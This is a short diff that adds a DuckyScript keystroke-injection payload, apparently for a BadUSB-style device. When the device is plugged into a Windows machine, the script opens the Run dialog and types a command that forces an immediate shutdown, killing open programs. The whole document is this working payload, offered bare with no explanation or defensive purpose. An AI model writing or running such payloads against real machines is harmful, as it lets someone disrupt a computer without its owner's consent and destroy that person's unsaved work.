@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING shutdown /s /f /t 0
+ENTER
